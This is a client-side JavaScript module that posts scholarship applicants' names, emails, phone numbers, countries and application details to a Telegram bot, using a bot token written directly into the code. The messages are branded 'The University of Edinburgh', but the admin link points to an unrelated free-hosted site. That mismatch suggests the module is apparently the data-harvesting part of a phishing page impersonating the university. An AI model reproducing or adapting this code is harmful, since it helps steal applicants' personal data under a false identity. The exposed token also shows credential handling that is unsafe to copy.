// js/telegram.js — Client-side Telegram Notification Engine (runs in-browser)
// Connects directly to Telegram Bot @assistmetobot (Token: 8613266324:AAH_XyegD48W-Yx9_aC_MKl5OgZ1cT9fd9M)

export const BOT_TOKEN = '8613266324:AAH_XyegD48W-Yx9_aC_MKl5OgZ1cT9fd9M';
export const BOT_USERNAME = 'assistmetobot';
export const BOT_LINK = `https://t.me/${BOT_USERNAME}`;

function esc(text) {
  return String(text || 'N/A')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Get active chat ID from localStorage or auto-resolve from getUpdates API
 */
export async function getChatId() {
  // Check if token changed; if so, clear previous cached chat ID
  const lastToken = localStorage.getItem('tg_bot_token_ver');
  if (lastToken !== BOT_TOKEN) {
    localStorage.removeItem('tg_chat_id');
    localStorage.setItem('tg_bot_token_ver', BOT_TOKEN);
  }

  const stored = localStorage.getItem('tg_chat_id');
  if (stored && stored.trim()) {
    return stored.trim();
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
    const data = await res.json();
    if (data.ok && data.result && data.result.length > 0) {
      for (let i = data.result.length - 1; i >= 0; i--) {
        const item = data.result[i];
        const chat = item.message?.chat || 
                     item.callback_query?.message?.chat || 
                     item.my_chat_member?.chat || 
                     item.channel_post?.chat;
        if (chat && chat.id) {
          const cid = String(chat.id);
          localStorage.setItem('tg_chat_id', cid);
          console.log(`[Telegram] Auto-connected chat ID: ${cid} (${chat.first_name || chat.username || ''})`);
          return cid;
        }
      }
    }
  } catch (e) {
    console.warn('[Telegram] Could not query getUpdates:', e.message);
  }
  return null;
}

export function setCustomChatId(chatId) {
  if (chatId) {
    localStorage.setItem('tg_chat_id', String(chatId).trim());
    return true;
  }
  return false;
}

/**
 * Send an administrative notification message to the Telegram bot
 */
export async function sendTelegramAlert(details) {
  const {
    fullName = '',
    email = '',
    country = '',
    phone = '',
    eventType = 'New Student Registration',
    scholarshipTitle = '',
    amount = '',
    extra = ''
  } = details;

  const chatId = await getChatId();
  if (!chatId) {
    console.warn(`[Telegram Alert] No chat ID linked yet. Open ${BOT_LINK} and send /start to receive alerts!`);
    return { ok: false, reason: 'NO_CHAT_ID', botLink: BOT_LINK };
  }

  const lines = [
    `🎓 <b>The University of Edinburgh</b>`,
    `🔔 <b>Alert:</b> ${esc(eventType)}`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `👤 <b>Student Name:</b> ${esc(fullName)}`,
    `📧 <b>Email:</b> ${esc(email)}`,
    `🌍 <b>Country:</b> ${esc(country)}`,
    phone ? `📞 <b>Phone:</b> ${esc(phone)}` : '',
    scholarshipTitle ? `🏆 <b>Target Scholarship:</b> ${esc(scholarshipTitle)}` : '',
    amount ? `💰 <b>Award Value:</b> ${esc(amount)}` : '',
    extra ? `📋 <b>Application Info:</b>\n${esc(extra)}` : '',
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `⏱️ <b>UTC:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
    `🏛️ <a href="https://uon-scholar-2026.web.app/#/admin">Staff Admin Dashboard</a>`
  ].filter(Boolean);

  const text = lines.join('\n');

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const data = await res.json();
    if (data.ok) {
      console.log(`[Telegram] ✅ Alert sent successfully to chat ${chatId} for: ${email}`);
      return { ok: true, data };
    } else {
      console.warn('[Telegram] ⚠️ Telegram API error:', data.description);
      return { ok: false, reason: data.description };
    }
  } catch (err) {
    console.error('[Telegram] ❌ Network error sending alert:', err.message);
    return { ok: false, reason: err.message };
  }
}

/**
 * Test message dispatcher for admin panel
 */
export async function sendTestMessage() {
  return await sendTelegramAlert({
    fullName: 'System Test Verification',
    email: 'admin@ed.ac.uk',
    country: 'United Kingdom',
    phone: '+44 131 650 1000',
    eventType: '✅ Live Telegram Bot Verification Test (@assistmetobot)',
    extra: 'Telegram real-time dispatch channel is operational and actively receiving applicant submissions.'
  });
}
